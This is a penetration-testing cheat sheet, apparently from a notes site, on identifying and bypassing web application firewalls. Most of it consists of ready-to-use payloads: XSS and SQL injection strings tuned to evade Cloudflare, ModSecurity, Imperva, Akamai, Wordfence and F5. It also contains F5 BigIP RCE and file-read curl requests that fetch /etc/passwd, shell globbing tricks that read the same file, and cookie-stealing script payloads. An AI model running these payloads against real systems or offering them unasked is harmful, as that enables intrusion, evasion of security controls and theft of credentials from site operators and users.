# WAFs

{% embed url="https://waf-bypass.com" %}

## Tools

```
whatwaf https://example.com
wafw00f https://example.com

# https://github.com/vincentcox/bypass-firewalls-by-DNS-history
bash bypass-firewalls-by-DNS-history.sh -d example.com

# Bypasser
# https://github.com/RedSection/pFuzz
# https://github.com/nemesida-waf/waf-bypass

# Domain IP history
https://viewdns.info/iphistory/

# Bypasses and info
https://github.com/0xInfection/Awesome-WAF
https://github.com/waf-bypass-maker/waf-community-bypasses
```

```
# Manual identification
dig +short target.com
curl -s https://ipinfo.io/<ip address> | jq -r '.com'

# Always check DNS History for original IP leak
https://whoisrequest.com/history/

# Waf detection
nmap --script=http-waf-fingerprint victim.com
nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 victim.com
nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro " victim.com
wafw00f victim.com

# Good bypass payload:
%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
javascript:”/*’/*`/* →<html \” onmouseover=/*&lt;svg/*/onload=alert()//>

# Bypass trying to access to :
dev.domain.com
stage.domain.com
ww1/ww2/ww3...domain.com
www.domain.uk/jp/

# Akamai
origin.sub.domain.com
origin-sub.domain.com
- Send header:
Pragma: akamai-x-get-true-cache-key
{{constructor.constructor(alert`1`)()}}
\');confirm(1);//
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#

# ModSecurity Bypass
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>

# Cloudflare
python3 cloudflair.py domain.com
# https://github.com/mandatoryprogrammer/cloudflare_enum
cloudflare_enum.py disney.com
https://viewdns.info/iphistory/?domain=domain.com
https://whoisrequest.com/history/

# Cloudflare bypasses
<!<script>alert(1)</script>
<a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert'1';>
<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>

# Aqtronix WebKnight WAF
- SQLi
0 union(select 1,@@hostname,@@datadir)
0 union(select 1,username,password from(users))
- XSS
<details ontoggle=alert(document.cookie)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

# ModSecurity
- XSS
<scr%00ipt>alert(document.cookie)</scr%00ipt>
onmouseover%0B=
ontoggle%0B%3D
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(“123”)>
- SQLi
1+uni%0Bon+se%0Blect+1,2,3

# Imperva Incapsula
https://medium.com/@0xpegg/imperva-waf-bypass-96360189c3c5
url.com/search?search=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%5F%24%24%2Bp%2E%24%24%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
- Parameter pollution SQLi
http://www.website.com/page.asp?a=nothing'/*&a=*/or/*&a=*/1=1/*&a=*/--+-
http://www.website.com/page.asp?a=nothing'/*&a%00=*/or/*&a=*/1=1/*&a%00=*/--+-
-XSS
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
<img/src="x"/onerror="[7 char payload goes here]">

# FAIL2BAN SQLi
(SELECT 6037 FROM(SELECT COUNT(*),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

# F5 BigIP
RCE: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
Read File: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
- XSS
<body style="height:1000px" onwheel=alert(“123”)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow=alert(“123”)>
<body style="height:1000px" onwheel="[JS-F**k Payload]"> 
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[]
)[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[
+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![
]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[
]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" on-
show="prom%25%32%33%25%32%36x70;t(1)">

# More payloads
https://github.com/Walidhossain010/WAF-bypass-xss-payloads

# Wordfence
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>

# RCE WAF globbing bypass
/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/???/p?s?w?
cat /etc$u/p*s*wd$u
```

![](<../../.gitbook/assets/image (28).png>)

![](<../../.gitbook/assets/image (13).png>)
